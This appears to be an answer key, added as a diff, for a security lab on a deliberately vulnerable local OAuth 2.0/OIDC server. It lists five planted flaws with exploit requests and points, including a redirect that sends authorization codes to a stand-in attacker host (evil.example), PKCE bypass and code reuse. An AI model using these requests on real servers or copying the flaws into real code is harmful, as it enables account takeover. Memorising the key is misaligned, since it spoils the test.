@@ -1,0 +1,52 @@
+{
+  "lab": "17-oauthforge",
+  "base_url": "http://127.0.0.1:18817",
+  "stack": "python-stdlib OAuth 2.0 / OIDC authorization server",
+  "vulns": [
+    {
+      "id": "H1",
+      "class": "open-redirect",
+      "severity": "high",
+      "route": "/authorize",
+      "desc": "Unvalidated redirect_uri: GET /authorize does NOT check redirect_uri against the client's registered allow-list, so it issues the authorization code to ANY attacker-supplied redirect_uri (302 Location). An attacker steals the auth code/token -> account takeover.",
+      "exploit": "GET /authorize?client_id=webapp&response_type=code&redirect_uri=http://evil.example/grab -> 302 Location: http://evil.example/grab?code=... (code sent to attacker).",
+      "points": 1
+    },
+    {
+      "id": "H2",
+      "class": "csrf",
+      "severity": "medium",
+      "route": "/authorize",
+      "desc": "Missing state parameter / CSRF: the authorization flow accepts but never requires or binds a `state` value, so there is no CSRF protection on the OAuth flow (login CSRF / authorization-code injection / account linking forgery).",
+      "exploit": "GET /authorize?client_id=webapp&response_type=code&redirect_uri=...  with NO state -> a code is still issued and the response confirms state_provided:false; the flow has no anti-CSRF binding.",
+      "points": 1
+    },
+    {
+      "id": "H3",
+      "class": "auth",
+      "severity": "high",
+      "route": "/token",
+      "desc": "Broken OAuth token endpoint: POST /token (a) does NOT authenticate the client (client_secret is ignored), (b) accepts an authorization code issued with a PKCE code_challenge WITHOUT the code_verifier (PKCE downgrade), and (c) never invalidates the code, so the same authorization code can be redeemed repeatedly (code reuse) for multiple access tokens.",
+      "exploit": "POST /token grant_type=authorization_code&code=<code>&client_id=webapp (no client_secret, no code_verifier) -> access_token. Repeat the SAME code -> another access_token (reuse).",
+      "points": 1
+    },
+    {
+      "id": "H4",
+      "class": "info-disc",
+      "severity": "medium",
+      "route": "/token",
+      "desc": "Verbose errors: a malformed request to /token (e.g. an invalid OIDC `claims` JSON) triggers a full Python traceback in the response, disclosing source paths and internals.",
+      "exploit": "POST /token grant_type=authorization_code&code=<valid>&claims=not-json -> 500 with full traceback.",
+      "points": 1
+    },
+    {
+      "id": "H5",
+      "class": "headers",
+      "severity": "low",
+      "route": "*",
+      "desc": "Missing security headers on all responses: no Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options, or HSTS.",
+      "exploit": "curl -I any endpoint -> none of CSP/XFO/XCTO/HSTS present.",
+      "points": 1
+    }
+  ]
+}
